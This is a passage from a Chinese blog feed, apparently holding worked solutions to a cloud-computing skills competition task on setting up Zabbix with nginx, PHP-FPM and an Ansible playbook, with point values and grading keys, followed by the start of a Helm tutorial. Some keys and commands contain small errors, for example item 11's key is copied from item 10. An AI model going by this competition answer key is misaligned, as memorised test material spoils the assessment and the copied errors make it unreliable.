<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/nginx/conf.d/default.conf</span><br><span class="line">修改内容如下</span><br><span class="line">root /usr/share/zabbix/;</span><br><span class="line">index index.php index.html index.htm;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">cat</span> /etc/nginx/conf.d/default.conf</span></span><br><span class="line">server &#123;</span><br><span class="line">listen 80;</span><br><span class="line">server_name localhost;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">access_log /var/log/nginx/host.access.log main;</span></span><br><span class="line"></span><br><span class="line">location / &#123;</span><br><span class="line">root /usr/share/zabbix/;</span><br><span class="line">index index.php index.html index.htm;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">error_page 404 /404.html;</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">redirect server error pages to the static page /50x.html</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">error_page 500 502 503 504 /50x.html;</span></span><br><span class="line">location = /50x.html &#123;</span><br><span class="line">root /usr/share/nginx/html;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">proxy the PHP scripts to Apache listening on 127.0.0.1:80</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#location ~ \.php$ &#123;</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">proxy_pass http://127.0.0.1;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">&#125;</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">location ~ \.php$ &#123;</span></span><br><span class="line">root /usr/share/zabbix;</span><br><span class="line">fastcgi_pass 127.0.0.1:9000;</span><br><span class="line">fastcgi_index index.php;</span><br><span class="line">fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;</span><br><span class="line">include fastcgi_params;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deny access to .htaccess files, <span class="keyword">if</span> Apache<span class="string">&#x27;s document root</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">concurs with nginx&#x27;</span>s one</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#location ~ /\.ht &#123;</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deny all;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="10-配置文件"><a href="#10-配置文件" class="headerlink" title="10.配置文件"></a>10.配置文件</h3><p>分别修改配置文件zabbix_server.conf(修改数据库密码)和zabbix_agentd.conf（修改服务器IP，活动服务器IP和主机名），并重启对应服务使配置生效。</p>
<p>   将cat &#x2F;etc&#x2F;zabbix_agentd.conf | grep -v ‘^#|^$’命令的返回结果提交到答题框。【2分】</p>
<p><strong>标准: Server&#x3D;192.168.100&amp;&amp;ServerActive&#x3D;192.168.100</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix_server ~]# vim /etc/zabbix_server.conf</span><br><span class="line">DBName=zabbix</span><br><span class="line">DBUser=zabbix</span><br><span class="line">DBPassword=password</span><br><span class="line">[root@zabbix_server ~]# vim /etc/zabbix_agentd.conf</span><br><span class="line">Server=192.168.100.91</span><br><span class="line">ServerActive=192.168.100.91</span><br><span class="line">Hostname=zabbix_server</span><br><span class="line">[root@zabbix_server ~]# cat /etc/zabbix_agentd.conf | grep -v &#x27;^#\|^$&#x27;</span><br><span class="line">PidFile=/run/zabbix/zabbix_agentd.pid</span><br><span class="line">LogFile=/var/log/zabbix/zabbix_agentd.log</span><br><span class="line">LogFileSize=0</span><br><span class="line">Server=192.168.100.91</span><br><span class="line">ServerActive=192.168.100.91</span><br><span class="line">Hostname=zabbix_server</span><br><span class="line">[root@master ~]# systemctl restart zabbix-server</span><br><span class="line">[root@master ~]# systemctl restart zabbix-agent</span><br></pre></td></tr></table></figure>

<h3 id="11-配置文件"><a href="#11-配置文件" class="headerlink" title="11.配置文件"></a>11.配置文件</h3><p>修改php.ini文件,其中最大POST数据限制为16M,程序执行时间限制为300，PHP页面接受数据所需最大时间限制为300，把时区设为Asia&#x2F;Shanghai,并重启相关服务。</p>
<p>  将cat &#x2F;etc&#x2F;php.ini | grep -v ‘^#|^$’命令的返回结果提交到答题框。【2分】</p>
<p>标准: Server&#x3D;192.168.100&amp;&amp;ServerActive&#x3D;192.168.100</p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix_server ~]# vim /etc/php.ini</span><br><span class="line">post_max_size = 16M</span><br><span class="line">max_execution_time = 300</span><br><span class="line">max_input_time = 300</span><br><span class="line">date.timezone = Asia/Shanghai</span><br><span class="line">[root@zabbix_server ~]# systemctl restart php74-php-fpm</span><br></pre></td></tr></table></figure>

<h3 id="12-配置文件"><a href="#12-配置文件" class="headerlink" title="12.配置文件"></a>12.配置文件</h3><p>修改<a href="http://www.conf/">www.conf</a>文件,把用户和组都设置为nginx.</p>
<p>将cat &#x2F;etc&#x2F;php-fpm.d&#x2F;<a href="http://www.conf/">www.conf</a> | grep -v ‘^;|^$’命令的返回结果提交到答题框。【2分】</p>
<p>标准: user&amp;&amp;nginx&amp;&amp;group</p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> [root@zabbix_server ~]# vim /etc/php-fpm.d/www.conf</span><br><span class="line">user = nginx</span><br><span class="line">group = nginx</span><br><span class="line">[root@zabbix_server ~]# cat /etc/php-fpm.d/www.conf | grep -v &#x27;^;\|^$&#x27;</span><br><span class="line">[www]</span><br><span class="line">listen = 127.0.0.1:9000</span><br><span class="line"> </span><br><span class="line">listen.allowed_clients = 127.0.0.1</span><br><span class="line">user = nginx</span><br><span class="line">group = nginx</span><br><span class="line">pm = dynamic</span><br><span class="line">pm.max_children = 50</span><br><span class="line">pm.start_servers = 5</span><br><span class="line">pm.min_spare_servers = 5</span><br><span class="line">pm.max_spare_servers = 35</span><br><span class="line">slowlog = /var/log/php-fpm/www-slow.log</span><br><span class="line">php_admin_value[error_log] = /var/log/php-fpm/www-error.log</span><br><span class="line">php_admin_flag[log_errors] = on</span><br><span class="line">php_value[session.save_handler] = files</span><br><span class="line">php_value[session.save_path] = /var/lib/php/session</span><br></pre></td></tr></table></figure>

<h3 id="13-配置文件"><a href="#13-配置文件" class="headerlink" title="13.配置文件"></a>13.配置文件</h3><p>修改zabbix.conf文件,把用户和组都设置为nginx,并将index.php所在的目录和php.ini文件拥有者和用户组改为nginx。重启相关服务，在浏览器中输入http:&#x2F;&#x2F;公网IP&#x2F; setup.php即可看到zabbix 6.0界面。</p>
<p>将curl http:&#x2F;&#x2F; 公网IP &#x2F;setup.php命令的返回结果提交到答题框。【2分】</p>
<p><strong>标准: SIA&amp;&amp;favicon.ico&amp;&amp;msapplication-config</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/php-fpm.d/zabbix.conf</span><br><span class="line">[zabbix]</span><br><span class="line">user = nginx</span><br><span class="line">group = nginx</span><br><span class="line">[root@zabbix_server ~]# chown -R nginx:nginx /usr/share/zabbix/</span><br><span class="line">[root@zabbix_server ~]# chown -R nginx:nginx /etc/opt/remi/php74/php.ini</span><br><span class="line">[root@zabbix_server ~]# chmod +x /usr/share/zabbix</span><br><span class="line">[root@zabbix_server ~]# systemctl restart nginx</span><br><span class="line">[root@zabbix_server ~]# systemctl restart zabbix-server</span><br><span class="line">[root@zabbix_server ~]# systemctl restart zabbix-agent</span><br><span class="line">[root@zabbix_server ~]# systemctl restart php74-php-fpm </span><br><span class="line">[root@zabbix_server ~]# curl http://123.249.10.60/setup.php</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">       &lt;head&gt;</span><br><span class="line">              &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=Edge&quot;/&gt;</span><br><span class="line">              &lt;meta charset=&quot;utf-8&quot; /&gt;</span><br><span class="line">              &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span><br><span class="line">              &lt;meta name=&quot;Author&quot; content=&quot;Zabbix SIA&quot; /&gt;</span><br><span class="line">              &lt;title&gt;Installation&lt;/title&gt;</span><br><span class="line">              &lt;link rel=&quot;icon&quot; href=&quot;favicon.ico&quot;&gt;</span><br><span class="line">              &lt;link rel=&quot;apple-touch-icon-precomposed&quot; sizes=&quot;76x76&quot; href=&quot;assets/img/apple-touch-icon-76x76-precomposed.png&quot;&gt;</span><br><span class="line">              &lt;link rel=&quot;apple-touch-icon-precomposed&quot; sizes=&quot;120x120&quot; href=&quot;assets/img/apple-touch-icon-120x120-precomposed.png&quot;&gt;</span><br><span class="line">              &lt;link rel=&quot;apple-touch-icon-precomposed&quot; sizes=&quot;152x152&quot; href=&quot;assets/img/apple-touch-icon-152x152-precomposed.png&quot;&gt;</span><br><span class="line">              &lt;link rel=&quot;apple-touch-icon-precomposed&quot; sizes=&quot;180x180&quot; href=&quot;assets/img/apple-touch-icon-180x180-precomposed.png&quot;&gt;</span><br><span class="line">              &lt;link rel=&quot;icon&quot; sizes=&quot;192x192&quot; href=&quot;assets/img/touch-icon-192x192.png&quot;&gt;</span><br><span class="line">              &lt;meta name=&quot;csrf-token&quot; content=&quot;5d4324e81318a310&quot;/&gt;</span><br><span class="line">              &lt;meta name=&quot;msapplication-TileImage&quot; content=&quot;assets/img/ms-tile-144x144.png&quot;&gt;</span><br><span class="line">              &lt;meta name=&quot;msapplication-TileColor&quot; content=&quot;#d40000&quot;&gt;</span><br><span class="line">              &lt;meta name=&quot;msapplication-config&quot; content=&quot;none&quot;/&gt;</span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;assets/styles/blue-theme.css?1675235994&quot; /&gt;</span><br><span class="line">&lt;script src=&quot;js/browsers.js?1674462826&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;jsLoader.php?ver=6.0.13&amp;amp;lang=en_US&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;jsLoader.php?ver=6.0.13&amp;amp;lang=en_US&amp;amp;files%5B0%5D=setup.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;&lt;div class=&quot;wrapper&quot;&gt;&lt;main&gt;&lt;form method=&quot;post&quot; action=&quot;setup.php&quot; accept-charset=&quot;utf-8&quot; id=&quot;setup-form&quot;&gt;&lt;div class=&quot;setup-container&quot;&gt;&lt;div class=&quot;setup-left&quot;&gt;&lt;div class=&quot;setup-logo&quot;&gt;&lt;div class=&quot;zabbix-logo&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;ul&gt;&lt;li class=&quot;setup-left-current&quot;&gt;Welcome&lt;/li&gt;&lt;li&gt;Check of pre-requisites&lt;/li&gt;&lt;li&gt;Configure DB connection&lt;/li&gt;&lt;li&gt;Settings&lt;/li&gt;&lt;li&gt;Pre-installation summary&lt;/li&gt;&lt;li&gt;Install&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;div class=&quot;setup-right&quot;&gt;&lt;div class=&quot;setup-right-body&quot;&gt;&lt;div class=&quot;setup-title&quot;&gt;&lt;span&gt;Welcome to&lt;/span&gt;Zabbix 6.0&lt;/div&gt;&lt;ul class=&quot;table-forms&quot;&gt;&lt;li&gt;&lt;div class=&quot;table-forms-td-left&quot;&gt;&lt;label for=&quot;label-default-lang&quot;&gt;Default language&lt;/label&gt;&lt;/div&gt;&lt;div class=&quot;table-forms-td-right&quot;&gt;&lt;z-select id=&quot;default-lang&quot; value=&quot;en_US&quot; focusable-element-id=&quot;label-default-lang&quot; autofocus=&quot;autofocus&quot; name=&quot;default_lang&quot; data-options=&quot;[&#123;&amp;quot;value&amp;quot;:&amp;quot;en_GB&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;English (en_GB)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;en_US&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;English (en_US)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;ca_ES&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Catalan (ca_ES)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;zh_CN&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Chinese (zh_CN)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;cs_CZ&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Czech (cs_CZ)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;fr_FR&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;French (fr_FR)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;de_DE&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;German (de_DE)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;he_IL&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Hebrew (he_IL)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;it_IT&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Italian (it_IT)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;ko_KR&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Korean (ko_KR)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;ja_JP&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Japanese (ja_JP)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;nb_NO&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Norwegian (nb_NO)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;pl_PL&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Polish (pl_PL)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;pt_BR&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Portuguese (pt_BR)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;pt_PT&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Portuguese (pt_PT)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;ro_RO&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Romanian (ro_RO)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;ru_RU&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Russian (ru_RU)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;sk_SK&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Slovak (sk_SK)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;tr_TR&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Turkish (tr_TR)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;uk_UA&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Ukrainian (uk_UA)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;vi_VN&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Vietnamese (vi_VN)&amp;quot;&#125;]&quot; tabindex=&quot;-1&quot;&gt;&lt;/z-select&gt;&lt;/div&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;setup-footer&quot;&gt;&lt;div&gt;&lt;button type=&quot;submit&quot; id=&quot;next_1&quot; name=&quot;next[1]&quot; value=&quot;Next step&quot;&gt;Next step&lt;/button&gt;&lt;button type=&quot;submit&quot; id=&quot;back_1&quot; name=&quot;back[1]&quot; value=&quot;Back&quot; class=&quot;btn-alt float-left&quot; disabled=&quot;disabled&quot;&gt;Back&lt;/button&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/form&gt;&lt;div class=&quot;signin-links&quot;&gt;Licensed under &lt;a target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot; class=&quot;grey link-alt&quot; href=&quot;https://www.zabbix.com/license&quot;&gt;GPL v2&lt;/a&gt;&lt;/div&gt;&lt;/main&gt;&lt;footer role=&quot;contentinfo&quot;&gt;Zabbix 6.0.13. &amp;copy; 2001&amp;ndash;2023, &lt;a class=&quot;grey link-alt&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot; href=&quot;https://www.zabbix.com/&quot;&gt;Zabbix SIA&lt;/a&gt;&lt;/footer&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h3 id="14-编写playbook"><a href="#14-编写playbook" class="headerlink" title="14.编写playbook"></a>14.编写playbook</h3><p>随机找一目录，在其下分别创建tasks和file目录，把autoDeployment.tar、编写好的repo文件和zabbix_agentd.conf传至file目录，在tasks目录下编写agent.yaml文件，要求在被监控机能远程部署zabbix-agent服务。</p>
<p>将cat agent.yaml命令的返回结果提交到答题框。【4分】</p>
<p><strong>标准: copy&amp;&amp;src&amp;&amp;dest&amp;&amp;yum&amp;&amp;name&amp;&amp;zabbix-agent&amp;&amp;state</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix_server opt]# cat agent.yaml</span><br><span class="line">---</span><br><span class="line">- hosts: agent</span><br><span class="line">  become: true</span><br><span class="line">  tasks:</span><br><span class="line">  - name: copy local.repo</span><br><span class="line">    copy:</span><br><span class="line">      src: local.repo</span><br><span class="line">      dest: /etc/yum.repos.d/local.repo</span><br><span class="line">  - name: Copy autoDeployment.tar</span><br><span class="line">    copy:</span><br><span class="line">      src: autoDeployment.tar</span><br><span class="line">      dest: /opt</span><br><span class="line">  - name: Copy zabbix_agentd.conf file</span><br><span class="line">    copy:</span><br><span class="line">      src: zabbix_agentd.conf</span><br><span class="line">      dest: /etc/zabbix/zabbix_agentd.conf</span><br><span class="line">      owner: zabbix</span><br><span class="line">      group: zabbix</span><br><span class="line">      mode: &#x27;0644&#x27;</span><br><span class="line">  - name: tar autoDeployment.tar</span><br><span class="line">    shell:</span><br><span class="line">      cmd: tar -vxf autoDeployment.tar  -C /opt</span><br><span class="line">  - name: Install Zabbix Agent</span><br><span class="line">    yum:</span><br><span class="line">      name: zabbix-agent</span><br><span class="line">      state: present</span><br><span class="line">  - name: Start and enable Zabbix Agent</span><br><span class="line">    service:</span><br><span class="line">      name: zabbix-agent</span><br><span class="line">      state: started</span><br><span class="line">      enabled: true</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>云计算</category>
        <category>技能大赛汇总</category>
      </categories>
      <tags>
        <tag>云计算</tag>
        <tag>云计算职业技能大赛</tag>
      </tags>
  </entry>
  <entry>
    <title>云计算方向-Helm入门到实战</title>
    <url>/posts/7a2988b3.html</url>
    <content><![CDATA[<p>详细见<a href="https://blog.csdn.net/bbwangj/article/details/81087911">(37条消息) kubernetes之helm简介、安装、配置、使用指南_菲宇的博客-CSDN博客_helm</a></p>
<p>Helm从入门到实践</p>
<p>Helm是Kubernetes的软件包的管理工具.</p>
<h1 id="Helm-是什么"><a href="#Helm-是什么" class="headerlink" title="Helm 是什么"></a>Helm 是什么</h1><p>Helm 是 Kubernetes 的包管理器。包管理器类似于我们在 Ubuntu 中使用的apt、Centos中使用的yum 或者Python中的 pip 一样，能快速查找、下载和安装软件包。Helm 由客户端组件 helm 和服务端组件 Tiller 组成, 能够将一组K8S资源打包统一管理, 是查找、共享和使用为Kubernetes构建的软件的最佳方式.</p>
<h1 id="Helm-解决了什么痛点？"><a href="#Helm-解决了什么痛点？" class="headerlink" title="Helm 解决了什么痛点？"></a>Helm 解决了什么痛点？</h1><p>在 Kubernetes中部署一个可以使用的应用，需要涉及到很多的 Kubernetes 资源的共同协作。比如你安装一个 WordPress 博客，用到了一些 Kubernetes (下面全部简称k8s)的一些资源对象，包括 Deployment 用于部署应用、Service 提供服务发现、Secret 配置 WordPress 的用户名和密码，可能还需要 pv 和 pvc 来提供持久化服务。并且 WordPress 数据是存储在mariadb里面的，所以需要 mariadb 启动就绪后才能启动 WordPress。这些 k8s 资源过于分散，不方便进行管理，直接通过 kubectl 来管理一个应用，你会发现这十分蛋疼。<br> 所以总结以上，我们在 k8s 中部署一个应用，通常面临以下几个问题：</p>
<ul>
<li>如何统一管理,配置和更新这些分散的k8s的应用资源文件</li>
<li>如何分发和复用一套应用模板</li>
<li>如何将应用的一系列资源当作一个软件包管理</li>
</ul>
<h1 id="Helm-相关组件及概念"><a href="#Helm-相关组件及概念" class="headerlink" title="Helm 相关组件及概念"></a>Helm 相关组件及概念</h1><p>Helm包含两个组件,分别是helm客户端和Tiller服务器</p>
<ul>
<li><strong>helm</strong> 是一个命令行工具，用于本地开发及管理chart，chart仓库管理等</li>
<li><strong>Tiller</strong> 是 Helm 的服务端。Tiller 负责接收 Helm 的请求，与 k8s 的 apiserver 交互，根据chart 来生成一个 release 并管理 release</li>
<li><strong>chart</strong> Helm的打包格式叫做chart，所谓chart就是一系列文件, 它描述了一组相关的 k8s 集群资源</li>
<li><strong>release</strong> 使用 helm install 命令在 Kubernetes 集群中部署的 Chart 称为 Release</li>
<li>Repoistory Helm chart 的仓库，Helm 客户端通过 HTTP 协议来访问存储库中 chart 的索引文件和压缩包</li>
</ul>
<h1 id="Helm-原理"><a href="#Helm-原理" class="headerlink" title="Helm 原理"></a>Helm 原理</h1><p>下面两张图描述了 Helm 的几个关键组件 Helm（客户端）、Tiller（服务器）、Repository（Chart 软件仓库）、Chart（软件包）之间的关系以及它们之间如何通信</p>
<p><img src="C:\Users\user\AppData\Roaming\Typora\typora-user-images\image-20230224145527721.png" alt="image-20230224145527721"></p>
<p><img src="C:\Users\user\AppData\Roaming\Typora\typora-user-images\image-20230224145540489.png" alt="image-20230224145540489"></p>
<h2 id="创建release"><a href="#创建release" class="headerlink" title="创建release"></a>创建release</h2><ul>
<li>helm 客户端从指定的目录或本地tar文件或远程repo仓库解析出chart的结构信息</li>
<li>helm 客户端指定的 chart 结构和 values 信息通过 gRPC 传递给 Tiller</li>
<li>Tiller 服务端根据 chart 和 values 生成一个 release</li>
<li>Tiller 将install release请求直接传递给 kube-apiserver</li>
</ul>
<h2 id="删除release"><a href="#删除release" class="headerlink" title="删除release"></a><strong>删除release</strong></h2><ul>
<li>helm 客户端从指定的目录或本地tar文件或远程repo仓库解析出chart的结构信息</li>
<li>helm 客户端指定的 chart 结构和 values 信息通过 gRPC 传递给 Tiller</li>
<li>Tiller 服务端根据 chart 和 values 生成一个 release</li>
<li>Tiller 将delete release请求直接传递给 kube-apiserver</li>
</ul>
<h2 id="更新release"><a href="#更新release" class="headerlink" title="更新release"></a>更新release</h2><ul>
<li>helm 客户端将需要更新的 chart 的 release 名称 chart 结构和 value 信息传给 Tiller</li>
<li>Tiller 将收到的信息生成新的 release，并同时更新这个 release 的 history</li>
<li>Tiller 将新的 release 传递给 kube-apiserver 进行更新</li>
</ul>
<h1 id="chart-的基本结构"><a href="#chart-的基本结构" class="headerlink" title="chart 的基本结构"></a>chart 的基本结构</h1><p>Helm的打包格式叫做chart，所谓chart就是一系列文件, 它描述了一组相关的 k8s 集群资源。Chart中的文件安装特定的目录结构组织, 最简单的chart 目录如下所示：</p>
<p><img src="C:\Users\user\AppData\Roaming\Typora\typora-user-images\image-20230224150030064.png" alt="image-20230224150030064"></p>
<ul>
<li>charts 目录存放依赖的chart</li>
<li>Chart.yaml 包含Chart的基本信息，包括chart版本，名称等</li>
<li>templates 目录下存放应用一系列 k8s 资源的 yaml 模板</li>
<li>_helpers.tpl 此文件中定义一些可重用的模板片断，此文件中的定义在任何资源定义模板中可用</li>
<li>NOTES.txt 介绍chart 部署后的帮助信息，如何使用chart等</li>
<li>values.yaml 包含了必要的值定义（默认值）, 用于存储 templates 目录中模板文件中用到变量的值</li>
</ul>
<h1 id="安装Helm"><a href="#安装Helm" class="headerlink" title="安装Helm"></a>安装Helm</h1><p>可以通过预编译的二进制文件来安装helm的客户端命令，具体的版本可以到helm的github上去下载：</p>
<p><a href="https://github.com/helm/helm/releases">https://github.com/helm/helm/releases</a></p>
<p>本文档使用的版本：</p>
<p><a href="https://get.helm.sh/helm-v3.7.2-linux-amd64.tar.gz">https://get.helm.sh/helm-v3.7.2-linux-amd64.tar.gz</a></p>
<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><h3 id="Helm客户端安装"><a href="#Helm客户端安装" class="headerlink" title="Helm客户端安装"></a>Helm客户端安装</h3><p>（1）先上传helm的压缩包到服务器</p>
<p>（2）解压并且复制helm命令</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">tar -zxf helm-v3.7.2-linux-amd64.tar.gz \</span><br><span class="line">&amp;&amp; <span class="built_in">cd</span> linux-amd64 \</span><br><span class="line"><span class="built_in">cp</span> helm /usr/local/bin/</span><br></pre></td></tr></table></figure>

<p>（3）验证helm命令</p>
<p>输入helm命令，如果输出如下，则表示helm安装成功</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@nccztsjb-node-11 linux-amd64]# helm</span><br><span class="line">The Kubernetes package manager</span><br><span class="line"></span><br><span class="line">Common actions <span class="keyword">for</span> Helm:</span><br><span class="line"></span><br><span class="line">- helm search:    search <span class="keyword">for</span> charts</span><br><span class="line">- helm pull:      download a chart to your <span class="built_in">local</span> directory to view</span><br><span class="line">- helm install:   upload the chart to Kubernetes</span><br><span class="line">- helm list:      list releases of charts</span><br><span class="line"></span><br><span class="line">Environment variables:</span><br><span class="line"></span><br><span class="line">| Name                               | Description                                                                       |</span><br><span class="line">|------------------------------------|-----------------------------------------------------------------------------------|</span><br><span class="line">| <span class="variable">$HELM_CACHE_HOME</span>                   | <span class="built_in">set</span> an alternative location <span class="keyword">for</span> storing cached files.                             |</span><br><span class="line">| <span class="variable">$HELM_CONFIG_HOME</span>                  | <span class="built_in">set</span> an alternative location <span class="keyword">for</span> storing Helm configuration.                       |</span><br><span class="line">| <span class="variable">$HELM_DATA_HOME</span>                    | <span class="built_in">set</span> an alternative location <span class="keyword">for</span> storing Helm data.                                |</span><br><span class="line">| <span class="variable">$HELM_DEBUG</span>                        | indicate whether or not Helm is running <span class="keyword">in</span> Debug mode                             |</span><br><span class="line">| <span class="variable">$HELM_DRIVER</span>                       | <span class="built_in">set</span> the backend storage driver. Values are: configmap, secret, memory, sql.       |</span><br><span class="line">| <span class="variable">$HELM_DRIVER_SQL_CONNECTION_STRING</span> | <span class="built_in">set</span> the connection string the SQL storage driver should use.                      |</span><br><span class="line">| <span class="variable">$HELM_MAX_HISTORY</span>                  | <span class="built_in">set</span> the maximum number of helm release <span class="built_in">history</span>.                                   |</span><br><span class="line">| <span class="variable">$HELM_NAMESPACE</span>                    | <span class="built_in">set</span> the namespace used <span class="keyword">for</span> the helm operations.                                   |</span><br><span class="line">| <span class="variable">$HELM_NO_PLUGINS</span>                   | <span class="built_in">disable</span> plugins. Set HELM_NO_PLUGINS=1 to <span class="built_in">disable</span> plugins.                        |</span><br><span class="line">| <span class="variable">$HELM_PLUGINS</span>                      | <span class="built_in">set</span> the path to the plugins directory                                             |</span><br><span class="line">| <span class="variable">$HELM_REGISTRY_CONFIG</span>              | <span class="built_in">set</span> the path to the registry config file.                                         |</span><br><span class="line">| <span class="variable">$HELM_REPOSITORY_CACHE</span>             | <span class="built_in">set</span> the path to the repository cache directory                                    |</span><br><span class="line">| <span class="variable">$HELM_REPOSITORY_CONFIG</span>            | <span class="built_in">set</span> the path to the repositories file.                                            |</span><br><span class="line">| <span class="variable">$KUBECONFIG</span>                        | <span class="built_in">set</span> an alternative Kubernetes configuration file (default <span class="string">&quot;~/.kube/config&quot;</span>)       |</span><br><span class="line">| <span class="variable">$HELM_KUBEAPISERVER</span>                | <span class="built_in">set</span> the Kubernetes API Server Endpoint <span class="keyword">for</span> authentication                         |</span><br><span class="line">| <span class="variable">$HELM_KUBECAFILE</span>                   | <span class="built_in">set</span> the Kubernetes certificate authority file.                                    |</span><br><span class="line">| <span class="variable">$HELM_KUBEASGROUPS</span>                 | <span class="built_in">set</span> the Groups to use <span class="keyword">for</span> impersonation using a comma-separated list.             |</span><br><span class="line">| <span class="variable">$HELM_KUBEASUSER</span>                   | <span class="built_in">set</span> the Username to impersonate <span class="keyword">for</span> the operation.                                |</span><br><span class="line">| <span class="variable">$HELM_KUBECONTEXT</span>                  | <span class="built_in">set</span> the name of the kubeconfig context.                                           |</span><br><span class="line">| <span class="variable">$HELM_KUBETOKEN</span>                    | <span class="built_in">set</span> the Bearer KubeToken used <span class="keyword">for</span> authentication.                                 |</span><br><span class="line"></span><br><span class="line">Helm stores cache, configuration, and data based on the following configuration order:</span><br><span class="line"></span><br><span class="line">- If a HELM_*_HOME environment variable is <span class="built_in">set</span>, it will be used</span><br><span class="line">- Otherwise, on systems supporting the 